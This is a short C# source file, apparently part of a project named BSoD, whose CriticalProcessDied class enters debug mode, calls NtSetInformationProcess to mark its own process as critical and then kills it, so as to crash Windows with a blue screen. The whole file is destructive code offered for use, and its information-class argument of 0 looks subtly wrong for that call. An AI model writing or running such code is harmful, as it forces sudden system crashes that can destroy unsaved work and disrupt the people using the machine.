using System;
using System.Diagnostics;
using BSoD.Natives;

namespace BSoD.Triggers
{
    internal class CriticalProcessDied
    {
        public static void Trigger()
        {
            Process.EnterDebugMode();
            int stat = 1;
            Native.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0, ref(stat), sizeof(int));
            Process.GetCurrentProcess().Kill();
        }
    }
}
